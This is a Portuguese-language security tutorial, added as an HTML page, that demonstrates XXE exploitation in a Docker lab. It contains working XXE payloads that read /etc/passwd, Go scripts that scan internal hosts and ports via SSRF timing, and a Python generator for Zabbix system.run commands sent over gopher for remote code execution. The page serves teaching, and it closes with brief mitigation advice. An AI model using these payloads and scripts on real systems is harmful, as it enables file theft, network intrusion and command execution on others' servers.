@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>XXE - a magnificência de seu impacto.</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body, h1,h2,h3,h4,h5,h6 {font-family: "Montserrat", sans-serif}
+.w3-row-padding img {margin-bottom: 12px}
+#main {margin-left: 000px}
+@media only screen and (max-width: 600px) {#main {margin-left: 0}}
+</style>
+</head>
+<body class="w3-black">
+
+
+<div class="w3-padding-large" id="main">
+  <header class="w3-container w3-padding-32 w3-center w3-black" id="home">
+    <h1 class="w3-jumbo"><span class="w3-hide-small">XML EXTERNAL ENTITY</span></h1>
+    <p>A magnificência de seu impacto.</p>
+  </header>
+
+  <center>
+  <div class="w3-content w3-justify w3-text-grey w3-padding-64" id="about">
+    <h2 class="w3-text-light-grey">Índice.</h2>
+    <hr style="width:200px" class="w3-opacity"> <!-- LINHA DAORA -->
+</p><ul id="42870f43-1768-4857-800f-f5787be65f67" class="toggle"><li><details open=""><summary>XML EXTERNAL ENTITY.</summary><ol type="1" id="b71bf81c-2ddb-46fa-98df-748dfe02f3c5" class="numbered-list" start="1"><li>Definição.</li></ol><ol type="1" id="4ec9e73d-e675-4242-8810-cee60746bfc8" class="numbered-list" start="2"><li>Como ocorre a vulnerabilidade?</li></ol><ol type="1" id="3fb38cdf-3ff8-4278-8d84-8489040f02e2" class="numbered-list" start="3"><li>Anatomia básica de um XXE.</li></ol></details></li></ul><ul id="9a0ce4c2-6e50-4914-be85-8d4c1a19d126" class="toggle"><li><details open=""><summary>Exploração.</summary><ol type="1" id="5f241c4c-6425-4867-b736-0dbb1bc55c92" class="numbered-list" start="1"><li>Leitura de arquivos internos.</li></ol><ol type="1" id="caefbc8b-98f4-4fed-8f84-ee1d13e32b3e" class="numbered-list" start="2"><li>Abusando do XXE para triggar um SSRF.</li></ol><ol type="1" id="44ba4394-428f-4246-8fa1-ad28d71be780" class="numbered-list" start="3"><li>Descoberta de hosts na rede.</li></ol><ol type="1" id="4c7f27e1-da61-4c95-ae9b-560b62ccc87a" class="numbered-list" start="4"><li>Port scanner na intranet.</li></ol><ol type="1" id="deda8140-b47b-4247-a79d-d12874b46bd3" class="numbered-list" start="5"><li>SSRF PROTOCOL SMUGGLING</li></ol><ol type="1" id="114725d1-ad69-4bc7-9e58-017b0bc19ceb" class="numbered-list" start="6"><li>Remote Code Execution 4 the WIN!</li></ol></details></li></ul><ul id="254b9398-87b4-4752-9400-2c5b43ccc2f0" class="toggle"><li><details open=""><summary>Considerações finais.</summary><ol type="1" id="16b6bc2b-5a5d-4acf-819e-b571860484ab" class="numbered-list" start="1"></ol><ol type="1" id="d9821ee3-c1ed-46c0-b053-ed9ad6bf9e93" class="numbered-list" start="1"><li>O que aprendemos?</li></ol><ol type="1" id="118306f2-d0c1-4064-9bae-b0cf9d87da29" class="numbered-list" start="2"><li>Agradecimentos.</li></ol><p id="e6efe48b-62d5-491a-93ee-024abeb72faa" class="">
+</p><p id="1537561c-0a63-4846-bdb5-b1c7f6a656ef" class="">
+
+
+	<br> </p></details></li></ul><hr id="cacd4e4a-5c1a-468e-911c-f7fec44a55ac"/><p id="953d75ff-3caa-4e0a-bf3b-4247fde35b8a" class="">
+
+	</p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/M4xDM4m.png"><img style="width:960px" src="https://i.imgur.com/M4xDM4m.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""> <!-- =========== PRIMEIRA IMAGEM -->
+
+ <p style="color:grey;font-size:16px;">
+	 <br>
+	 Quando se falam sobre <strong>XML EXTERNAL ENTITY</strong> e seu impacto, apenas correlacionam o mesmo à leituras de arquivos no qual um usuário não deveria ter acesso. Entretanto, caso a vulnerabilidade seja extraída com 100% do que lhes é oferecido, a leitura de arquivos se tornam “pequenas”. Enumeração de hosts na rede, port scan e até mesmo um Remote Code Execution se tornam possíveis com ela.
+	<br>
+	Apesar de pouco comentada, tal vulnerabilidade se traz presente no TOP 3 da OWASP 2021: Injection. A vulnerabilidade <strong>XML EXTERNAL ENTITY</strong> ocorre quando o atacante possui controle do código que será enviado ao processador de dados XML do servidor, código este que pode conter injeções maliciosas, como visto abaixo:
+</p>
+
+<br>
+<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+	&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+&lt;/stockCheck&gt;</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Como visto acima, o código XML utilizado pelo atacante utiliza das permissões server side que o mesmo terá para ler o arquivo <strong>/etc/passwd</strong> do servidor. Para isso, o atacante criou um <strong>DOCTYPE</strong>, onde nele tem um <strong>ENTITY</strong> (dando sentido do nome da vulnerabilidade, “external entity”) chamado <strong>xxe</strong>, que puxará o arquivo especificado pelo <strong>file://</strong>. Com a criação do ENTITY, ele será puxado (como se fosse uma função) no elemento productId, como podemos ver no <strong>“<productId>&xxe;</productId>”</strong>.
+</p>
+
+<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+
+<br><center></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/XJ23LjU.png"><img style="width:280px" src="https://i.imgur.com/XJ23LjU.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Agora, partindo para o ambiente de testes, foi configurado um contâiner docker rodando um web server vulnerável ao ataque de XXE. A imagem abaixo representa a requisição interceptada que enviamos ao servidor utilizando o software BurpSuite. 
+</p>
+
+<br><center></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/qX3iITu.png"><img style="width:880px" src="https://i.imgur.com/qX3iITu.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Note que o email "emailteste@gmail.com", especificado no elemento &lt;email&gt;, é retornado na index da requisição. Tendo isso em mente, tentaremos injetar um ENTITY externo que será responsável por ler o arquivo /etc/passwd e chamá-lo no elemento &lt;email&gt;, elemento este que é retornado na resposta da requisição. 
+</p>
+
+<br><center></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/wV2RZHT.png"><img style="width:880px" src="https://i.imgur.com/wV2RZHT.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Como vimos, perfomamos um ataque de XML External Entity com sucesso, onde nele conseguimos obter arquivos internos do servidor. Podemos também codificá-lo em base64 diretamente pelo XML utilizando um wrapper do PHP, veja abaixo: 
+</p>
+
+<br><pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;UTF&#45;8&quot;?&gt;
+&lt;!DOCTYPE&nbsp;foo&nbsp;[&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;php://filter/read=convert.base64&#45;encode/resource=file:///etc/passwd&quot;&gt;&nbsp;]&gt;
+&lt;root&gt;
+	&lt;name&gt;guilherme&lt;/name&gt;
+	&lt;tel&gt;558593123812&lt;/tel&gt;
+	&lt;email&gt;&amp;xxe;&lt;/email&gt;
+	&lt;password&gt;123456&lt;/password&gt;
+&lt;/root&gt;</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class=""><br>
+
+<br><center></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/vDYNylM.png"><img style="width:620px" src="https://i.imgur.com/vDYNylM.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+<br> </p></details></li></ul><hr id="cacd4e4a-5c1a-468e-911c-f7fec44a55ac"/><p id="953d75ff-3caa-4e0a-bf3b-4247fde35b8a" class="">
+
+<center><br></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/CuVh1US.png"><img style="width:660px" src="https://i.imgur.com/CuVh1US.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+ <p style="color:grey;font-size:16px;">
+A vulnerabilidade SSRF (Server Side Request Forgery) ocorre quando um atacante controla as requisições que serão enviadas em nome do servidor, podendo assim, enviar requisições maliciosas se passando pelo próprio server - requisições essas que podem explorar endpoints não autorizados pelo usuário, acessar metadatas da AWS, enumerar a rede, etc.. Caso queira se aprofundar mais, visite <a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a> .
+	<br><br>
+Ademais, o que pouco se fala é que XXE também permite que você explore dessa vulnerabilidade. Veremos abaixo como torná-la ao nosso favor utilizando-na para varredura de hosts na rede. Para isso, é necessário que saibamos qual o DHCP da rede. Em sistemas operacionais Linux, existe um arquivo padrão para resolução de nomes de DNS locais chamado <strong>/etc/hosts</strong>, onde nele é comum ter o endereço IP da máquina local. Veja:
+</p>
+
+<br></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/ham0qF0.png"><img style="width:860px" src="https://i.imgur.com/ham0qF0.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class="">
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Como vimos, o endereço IP do contâiner local é “172.17.0.2”. Com isso, sabemos que o endereço IP dos hosts da rede será “172.17.0.X”. Para enviarmos requisições para diferentes hosts dentro da rede, podemos utilizar o código XML abaixo:</p>
+
+
+<br><pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;UTF&#45;8&quot;?&gt;
+&lt;!DOCTYPE&nbsp;foo&nbsp;[&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;http://172.17.0.1&quot;&gt;&nbsp;]&gt;
+&lt;root&gt;
+	&lt;name&gt;guilherme&lt;/name&gt;
+	&lt;tel&gt;558593123812&lt;/tel&gt;
+	&lt;email&gt;&amp;xxe;&lt;/email&gt;
+	&lt;password&gt;123456&lt;/password&gt;
+&lt;/root&gt;
+</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+
+ <p style="color:grey;font-size:16px;">
+ 	<br><br>
+Notado acima, o ENTITY irá enviar uma requisição para o endereço IP “172.17.0.1”. Um fato interessante que nos ajudará a descobrir quais hosts estão ativos é que, ao enviar uma requisição a um host que não existe, ele sofre de um delay para retornar a response no BurpSuite. Veja: 
+</p><br>
+
+<center>
+	<iframe width="820" height="615"
+	src="https://www.youtube.com/embed/cFPrn95CNUs">
+	</iframe>
+</center>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Perceba que ao enviar uma requisição HTTP para o host “172.17.0.3”, ele sofre de um delay de mais ou menos 3~4 segundos. Ao enviarmos outra requisição, mas agora para um host válido (o da máquina local), o delay não acontece mais, afirmando que de fato o host é existente na rede. Visto o ambiente da situação, não podemos mais fugir: let’s code.
+</p>
+	<br>
+
+<div style="border:1px dotted white;">
+	
+	<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+	tempo_inicial := time.Now().Unix() // inicio do delay
+
+		req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
+		error(err)
+
+		defer req.Body.Close()
+
+		request, err := cli.Do(req)
+		_ = request
+		error(err)
+
+		tempo_final := time.Now().Unix() // fim do delay
+	</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+</div>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+O que o código acima faz é marcar a cronometragem de cada envio de requisição e o quanto ela demora para ser retornada. Perceba que em hosts que não existem na rede, eles demoram cerca de 3 segundos para receber a resposta da requisição:
+</p>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+rei.ayanami ~/projetos/artigo/xxe/ssrf $ go run main.go <br>
+0 segundos <br>
+0 segundos <br>
+4 segundos <br>
+3 segundos <br>
+3 segundos <br>
+3 segundos <br>
+<br>
+</p>
+
+ <p style="color:grey;font-size:16px;">
+Com isso, programei um script em Golang (i ❤️ go) para analisar o tempo de resposta de cada requisição, e, caso elas demorem menos de 3 segundos, é sinal de que o host está ativo na intranet.
+</p>
+
+<br><div style="border:1px dotted white;">
+	
+	<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+	/*
+	ressaltamos&nbsp;aqui&nbsp;a&nbsp;importância&nbsp;de&nbsp;saber&nbsp;programação&nbsp;em&nbsp;cibersegurança
+	*/
+	package&nbsp;main
+
+	import&nbsp;&quot;os&quot;
+	import&nbsp;&quot;fmt&quot;
+	import&nbsp;&quot;time&quot;
+	import&nbsp;&quot;strings&quot;
+	import&nbsp;&quot;net/http&quot;
+	import&nbsp;&quot;crypto/tls&quot;
+
+	func&nbsp;error(err&nbsp;interface{}){
+		if&nbsp;err&nbsp;!=&nbsp;nil&nbsp;{
+			fmt.Println(err)
+			os.Exit(0)
+		}
+	}
+
+	func&nbsp;conx(url,&nbsp;host&nbsp;string){
+		/*
+		nesta&nbsp;função,&nbsp;eu&nbsp;envio&nbsp;o&nbsp;código&nbsp;XML&nbsp;para&nbsp;o&nbsp;servidor
+		e&nbsp;neste&nbsp;código&nbsp;terá&nbsp;todo&nbsp;o&nbsp;range&nbsp;de&nbsp;IP&nbsp;da&nbsp;rede&nbsp;172.17.0.1/24
+		*/
+	cli&nbsp;:=&nbsp;&amp;http.Client{Transport:&nbsp;&amp;http.Transport{TLSClientConfig:&nbsp;&amp;tls.Config{InsecureSkipVerify:&nbsp;true}}}
+
+		var&nbsp;payload&nbsp;string&nbsp;=&nbsp;fmt.Sprintf(`&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;UTF&#45;8&quot;?&gt;
+	&lt;!DOCTYPE&nbsp;foo&nbsp;[&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;http://%s/&quot;&gt;&nbsp;]&gt;
+	&lt;root&gt;
+		&lt;name&gt;guilherme&lt;/name&gt;
+		&lt;tel&gt;558593123812&lt;/tel&gt;
+		&lt;email&gt;&amp;xxe;&lt;/email&gt;
+		&lt;password&gt;123456&lt;/password&gt;
+	&lt;/root&gt;`,&nbsp;host)
+		
+		tempo_inicial&nbsp;:=&nbsp;time.Now().Unix()&nbsp;//&nbsp;inicio&nbsp;do&nbsp;delay
+
+		req,&nbsp;err&nbsp;:=&nbsp;http.NewRequest(http.MethodPost,&nbsp;url,&nbsp;strings.NewReader(payload))
+		error(err)
+
+		defer&nbsp;req.Body.Close()
+
+		request,&nbsp;err&nbsp;:=&nbsp;cli.Do(req)
+		_&nbsp;=&nbsp;request
+		error(err)
+
+		tempo_final&nbsp;:=&nbsp;time.Now().Unix()&nbsp;//&nbsp;fim&nbsp;do&nbsp;delay
+
+		cronometragem&nbsp;:=&nbsp;tempo_final&nbsp;&#45;&nbsp;tempo_inicial
+
+		if&nbsp;cronometragem&nbsp;&lt;&nbsp;3&nbsp;{
+			fmt.Println(host&nbsp;+&nbsp;&quot;&nbsp;existente&nbsp;na&nbsp;rede.&quot;)
+		}
+	}
+
+	func&nbsp;main(){
+		for&nbsp;i&nbsp;:=&nbsp;1&nbsp;;&nbsp;i&nbsp;&lt;=&nbsp;256&nbsp;;&nbsp;i++{
+			/*
+			aqui&nbsp;eu&nbsp;crio&nbsp;um&nbsp;loop&nbsp;de&nbsp;256&nbsp;números
+			estes&nbsp;números&nbsp;irão&nbsp;substituir&nbsp;o&nbsp;%d&nbsp;de&nbsp;&quot;172.17.0.%d&quot;
+			e,&nbsp;seguidamente,&nbsp;serão&nbsp;enviados&nbsp;a&nbsp;função&nbsp;de&nbsp;cima
+			*/
+			host&nbsp;:=&nbsp;fmt.Sprintf(&quot;172.17.0.%d&quot;,&nbsp;i)
+			conx(&quot;http://172.17.0.2/process.php&quot;,&nbsp;host)
+		}
+	} </code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+</div>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+rei.ayanami ~/projetos/artigo/xxe/ssrf $ go run main.go <br>
+172.17.0.1 existente na rede. <br>
+172.17.0.2 existente na rede. <br>
+</p>
+
+<center> <br></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/PAn6VbG.png"><img style="width:360px" src="https://i.imgur.com/PAn6VbG.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""> </center>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Tendo em vista os hosts ativo na rede, partiremos agora para a segunda etapa do reconhecimento: a descoberta de portas ativas. Ao tentar me conectar numa porta não ativa, ocorre justamente o contrário do que foi descrito acima: não há delay. Ademais, quando tento conectar-me numa porta aberta, há um delay de aproximadamente 4~5 segundos. A lógica continua exatamente a mesma, com exceção de que faremos um bruteforce de portas ao invés de host. 
+</p>
+<br>
+<div style="border:1px dotted white;">
+	
+	<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+	func&nbsp;main(){
+	&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;:=&nbsp;[]int{22,&nbsp;53,&nbsp;80,&nbsp;81,&nbsp;8080,&nbsp;3216,&nbsp;8081,&nbsp;21,&nbsp;25,&nbsp;3000,&nbsp;3306,&nbsp;33060,&nbsp;3389,&nbsp;139,&nbsp;445,
+	&nbsp;1434,&nbsp;389,&nbsp;636,&nbsp;3268,&nbsp;3269,&nbsp;8000,&nbsp;10050,&nbsp;10051,&nbsp;389,&nbsp;636,&nbsp;3268,&nbsp;3269,&nbsp;1433,&nbsp;2375,&nbsp;2376,&nbsp;3128}
+	&nbsp;&nbsp;
+		for&nbsp;_,&nbsp;portas&nbsp;:=&nbsp;range&nbsp;array&nbsp;{
+			host&nbsp;:=&nbsp;fmt.Sprintf(&quot;172.17.0.1:%d&quot;,&nbsp;portas)
+			host2&nbsp;:=&nbsp;fmt.Sprintf(&quot;172.17.0.2:%d&quot;,&nbsp;portas)
+			
+			conx(&quot;http://172.17.0.2/process.php&quot;,&nbsp;host)
+			conx(&quot;http://172.17.0.2/process.php&quot;,&nbsp;host2)
+		}
+	}
+	</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+</div>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Perceba que nesta função (não mostrei o código inteiro porque ele é praticamente igual ao primeiro :P) há um array que contém as portas mais utilizadas para seus respectivos serviços. O papel do script é detectar delays baseados nas respostas das requisições, igual ao script anterior. Caso o alvo, com sua porta especificada, retorne algum delay considerável, é sinal de que ela está ativa.
+</p>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+rei.ayanami ~/projetos/artigo/xxe/ssrf $ go run main.go <br>
+172.17.0.1:22<br> 
+172.17.0.1:3306<br>
+172.17.0.1:10050 <br>
+172.17.0.1:10051 <br>
+172.17.0.2:22 <br>
+172.17.0.2:8080<br>
+</p>
+
+<br> </p></details></li></ul><hr id="cacd4e4a-5c1a-468e-911c-f7fec44a55ac"/><p id="953d75ff-3caa-4e0a-bf3b-4247fde35b8a" class="">
+
+	<br>
+</p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/wGc05fR.png"><img style="width:960px" src="https://i.imgur.com/wGc05fR.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class="">
+
+ <p style="color:grey;font-size:16px;">
+ 	<br><br>
+Tendo em vista o ambiente em que estamos, onde detectamos quais hosts estão ativos e suas respectivas portas abertas, é hora de explorarmos o apogeu do XML External Entity: o Remote Code Execution. Para isso, utilizaremos de uma técnica entitulada de SSRF PROTOCOL SMUGGLING. Nela, utilizaremos o protocolo <strong>gopher</strong> para enviarmos uma requisição TCP à porta que especificarmos (neste caso, a porta do zabbix [10050]), onde na requisição terá o código que levará o serviço à execução de comandos.
+<br><br>
+O Zabbix, representado comumente pela porta 10050/10051, é um software open source de monitoramento de rede com o intuito de torná-la mais segura. Nele, é possível adicionar servidores, máquinas virtuais e dispositivos de redes simultâneamentes. Seguidamente, veremos como utilizarmos a documentação do Zabbix para explorarmos um Remote Code Execution através de um External Entity SSRF.
+<br><br>
+Os que já exploraram desta técnica, sabem que existe uma ferramenta disponibilizada no GitHub chamada <a href="https://portswigger.net/web-security/ssrf"> Gopherus</a>. Infelizmente, o módulo de exploração do zabbix encontra-se desatualizado :( .. eles pararam na versão 1.8, e já estamos na 6.0 .. então, para que executemos o ataque, é necessário que tenhamos conhecimento do funcionamento da API do Zabbix, sendo possível encontrá-la <a href="https://www.zabbix.com/documentation/5.4/pt/manual/appendix/items/activepassive"> aqui</a>.
+<br><br>
+Abaixo, o código que utilizei para a exploração do protocol smuggling zabbix:
+</p>
+<br>
+<div style="border:1px dotted white;">
+	
+	<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+ import&nbsp;requests
+ import&nbsp;struct
+ import&nbsp;urllib.parse
+
+ def&nbsp;create_payload(key):
+	 header&nbsp;=&nbsp;&quot;ZBXD\x01&quot;
+	 data&nbsp;=&nbsp;key
+	 datalen_total&nbsp;=&nbsp;len(data)+2
+	 datalen&nbsp;=&nbsp;struct.pack(&quot;&lt;Q&quot;,datalen_total)
+
+	 print(&quot;_&quot;+urllib.parse.quote(header)+urllib.parse.quote(datalen.decode())+urllib.parse.quote(data))
+
+ while&nbsp;True:
+	 cmd&nbsp;=&nbsp;input(&#39;&sect;&#39;)
+	 create_payload(&quot;system.run[&quot;+cmd+&quot;,wait]&quot;)
+	</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+</div>
+
+ <p style="color:grey;font-size:16px;">
+ 	<br>
+Primeiramente, foi definida a variável header como especificada na API. Posteriormente, há outra variável, agora para o comando que será executado. Na variável "datalen_total", é definido o "lenght" do comando e adicionado dois caracteres. Agora, na última variável, a codificação em UTF-16LittleEdian do "datalen_total". E, por último, a codificação em URL Encode de todo o processo.
+</p>
+
+<p style="color:grey;font-size:16px;">
+	 <br>
+	rei.ayanami ~/projetos/zabbix $ python3 exploit.py <br>
+	$touch /tmp/pwned.txt <br>
+	_ZBXD%01%27%00%00%00%00%00%00%00system.run%5Btouch%20/tmp/pwned.txt%2Cwait%5D <br> 
+	$
+</p>
+
+<p style="color:grey;font-size:16px;">
+	 <br> 
+Nosso payload para o gopher está pronto. Agora, enviaremos a requisição para o contâiner 172.17.0.1 (contâiner este que está rodando o zabbix_agentd, vimos no port scan) utilizando-nos da vulnerabilidade XXE. Abaixo, o código XML utilizado para o envio da requisição:
+</p>
+
+<br><pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;UTF&#45;8&quot;?&gt;
+&lt;!DOCTYPE&nbsp;foo&nbsp;[&nbsp;&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;&quot;gopher://172.17.0.1:10050/_ZBXD%01%27%00%00%00%00%00%00%00system.run
+%5Btouch%20/tmp/pwned.txt%2Cwait%5D&quot;&gt;&nbsp;]&gt;
+&lt;root&gt;
+	&lt;name&gt;guilherme&lt;/name&gt;
+	&lt;tel&gt;558593123812&lt;/tel&gt;
+	&lt;email&gt;&amp;xxe;&lt;/email&gt;
+	&lt;password&gt;123456&lt;/password&gt;
+&lt;/root&gt;</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class=""><br>
+
+<p style="color:grey;font-size:16px;">
+Ao enviarmos o código acima ao servidor, ele interpretará o XML e enviará a requisição especificada na porta 10050 utilizando o protocolo gopher, onde será executado o comando "touch /tmp/pwned.txt" no contâiner 172.17.0.1, onde este está rodando o zabbix. Ao entrar no mesmo, eu percebo que o comando de fato foi executado:
+
+<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+/tmp # ls -al
+total 12
+drwxrwxrwt    	1 root     root          4096 May  9 03:52 .
+drwxr-xr-x    	1 root     root          4096 May  9 03:42 ..
+drwxr-xr-x    	2 root     root          4096 Feb 21  2020 hsperfdata_root
+-rw-r--r--    	1 zabbix     zabbix             0 May  9 03:52 pwned.txt
+</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+</p>
+
+<br> </p></details></li></ul><hr id="cacd4e4a-5c1a-468e-911c-f7fec44a55ac"/><p id="953d75ff-3caa-4e0a-bf3b-4247fde35b8a" class="">
+
+<center></p><figure id="9f1f2c05-5415-4863-ab23-52bace2cc676" class="image"><a href="https://i.imgur.com/49dYzTw.png"><img style="width:860px" src="https://i.imgur.com/49dYzTw.png"/></a></figure><p id="ac7df1f7-b22d-44d3-96b3-6466b338535b" class=""></center>
+
+<p style="color:grey;font-size:16px;">
+<br>
+Como vimos neste artigo, um ataque de XML EXTERNAL ENTITY se torna uma vulnerabilidade crítica dada às condições impostas. Primeiramente, conseguimos a leitura de arquivos internos do servidor, arquivos estes que nenhum usuário comum deveria ter acesso e que podem levar o comprometimento da confidencialidade do próprio. Posteriormente, ao decorrer da exploração, conseguimos utilizá-la para um ataque de falsificação de requisições do lado do servidor, onde neste mesmo ataque, aproveitamos para uma etapa de reconhecimento da rede local onde hospeda o servidor. <br> <br>
+No quesito de rede, conseguimos realizar uma varredura de hosts ativos e suas respectivas portas abertas. Nelas, notamos a existência do serviço Zabbix, serviço este cujo utilitário é o monitoramento de rede. Tal serviço também nos possibilitou a utilização de uma técnica chamada de "SSRF Protocol Smuggling", que nos permitiria a execução remota de comandos no host. <br> <br>
+Vimos sobre o funcionamento da API do Zabbix para a comunicação com o "Zabbix Agent" e como poderíamos torná-la ao nosso favor para um eventual Remote Code Execution. O conhecimento em programação tornou-se também essencial para a realização do ataque, onde precisamos programar dois scripts para varreduras de hosts/portas na intranet. <br> <br>
+Vale ressaltar que XXE não oferece mais suporte ao Gopher, ele poderá somente ser utilizado em aplicações rodando Java < 1.7. Ademais, existem mais vários outros protocolos que podem ser utilizados para exfiltração de dados (como file, jar, ftp ..) e vários outros métodos para triggar ao RCE. :) Lembre-se sempre que você terá acesso à endpoints que usuários comuns não têm acesso, use-o ao seu favor! <br> <br>
+Abaixo, algumas das lições que aprendemos neste artigo:
+
+
+<pre id="0b53e446-6dbc-4ee3-a72f-708e3e2b15a1" class="code"><code>
+01. atualize seu java 
+02. vida longa ao gopher
+03. nmap é pros fracos
+04. ponha restrições ao xml enviado
+</code></pre><p id="44b0237a-963a-4fad-a7f2-51720960c234" class="">
+
+<p style="color:grey;font-size:16px;">
+<br>
+Agradeço a todos que disponibilizaram do próprio tempo para a leitura deste artigo =], o foco primordial dessa leitura é exibir o quão poderosa a vulnerabilidade de XML EXTERNAL ENTITY pode se tornar e o quão multifuncionalidade ela é. Saímos aqui com a mentalidade de sempre impôr restrições ao usuário na hora de um envio de XML. Obrigado! <br> <br> <br>
+
+GitHub : <a href="https://github.com/march0s1as"> https://github.com/march0s1as</a> <br>
+LinkedIn :  <a href="https://www.linkedin.com/in/guilhermedc/" > https://www.linkedin.com/in/guilhermedc/</a>
+
+
+
+</body>
+</html>
